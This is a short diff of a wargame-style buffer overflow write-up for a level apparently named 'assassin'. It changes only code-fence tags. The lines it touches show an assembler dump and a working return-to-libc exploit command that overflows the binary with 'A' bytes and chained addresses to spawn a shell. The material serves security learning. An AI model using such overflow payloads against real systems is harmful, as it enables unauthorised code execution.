@@ -54,7 +54,7 @@ main(int argc, char *argv[])
 
 ### 0x01. Analysis
 
-```assembly
+```
 Dump of assembler code for function main:
 0x8048470 <main>:		push   %ebp
 0x8048471 <main+1>:		mov    %ebp,%esp
@@ -133,7 +133,7 @@ system = 0x40058ae0
 
 ### 0x02. Exploit
 
-```sh
+```
 [giant@localhost giant]$ ./assassin `python -c 'print "A"*44+"\x1e\x85\x04\x08"+"\xe0\x8a\x05\x40"*2+"\xf9\xbf\x0f\x40"'`
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@�@�@
 bash$ my-pass
